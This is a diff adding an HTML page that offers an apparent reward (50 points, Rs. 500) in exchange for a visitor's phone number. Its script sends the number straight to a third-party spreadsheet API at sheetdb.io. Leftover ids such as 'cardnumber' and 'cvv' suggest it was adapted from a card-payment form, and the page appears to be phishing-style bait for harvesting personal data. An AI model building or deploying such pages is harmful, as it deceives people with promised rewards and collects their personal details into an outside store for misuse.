@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Phone number</title>
+  <link rel="stylesheet" href="./style2.css">
+    <link rel="icon" href="tabicon.png">
+  
+<div class="topnav">
+  <a href="#home" class="active">
+    <img src="phone.png" height="50px"></a>
+    <P align="center">Add a Phone Number</P>
+  </div>
+</head>
+
+<body>
+
+<form action="https://sheetdb.io/api/v1/c0eb8kgqafs4c" method="post" id="sheetdb-form">
+
+
+<div class="form-container">
+        <div class="field-container">
+     <label for="cvv"><font color="red">*</font>Phone number
+          </label>
+          <div class="blank"></div>
+          <div class="typer">
+            <input id="cardnumber" maxlength="12" type="text" inputmode="numeric" autocomplete="autocomplete" autofocus="autofocus"
+            placeholder="Phone number" required 
+             name="data[Phone Number]">
+          <option>+94</option>
+        </div></div>
+    </div> 
+    <div class="botcontain">
+         <div class="para">
+             <p align="left">We will send a confirmation message to your number.</p>
+          </div>
+          <br>
+          <div class="creditbtn">
+             <button type="submit">Submit
+             </button>
+          </div>
+    </div>     
+
+
+</form>
+<div class="bottom">
+    <P align="left">Points</P>
+    <P align="left">Total</P>
+  </div>
+
+<div class="bottom2">
+    <P align="right">50</P>
+    <P align="right">Rs. 500</P>
+  </div>
+
+<div class="loadex">
+    <img src="loadex.gif"  alt="Loading..." />
+</div>
+ <script>
+            var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("sheetdb-form")),
+          }).then(
+              response => response.json()
+          ).then((html) => {
+            // you can put any JS code here
+            window.open('success/index.html', '_blank');
+
+          });
+        });
+ </script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js'></script>
+  <script  src="./script.js"></script> 
+  <script  src="load.js"></script>
+
+</body>
+</html>
